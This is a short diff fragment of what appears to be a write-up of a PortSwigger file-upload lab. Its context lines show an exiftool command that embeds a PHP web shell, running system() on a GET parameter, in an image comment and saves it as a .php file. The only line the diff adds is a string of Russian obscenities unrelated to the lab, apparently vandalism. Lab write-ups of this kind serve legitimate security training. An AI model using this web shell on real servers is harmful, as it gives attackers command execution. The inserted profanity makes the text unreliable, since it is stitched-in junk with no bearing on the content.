@@ -28,3 +28,4 @@ Content-Type: application/x-php
 ```bash
 exiftool -Comment='<?php echo system($_GET['command']); ?>' ~/Downloads/876t.jpg -o portswigger.php
 ```
+Хуй пенис жопа яйца влагалище
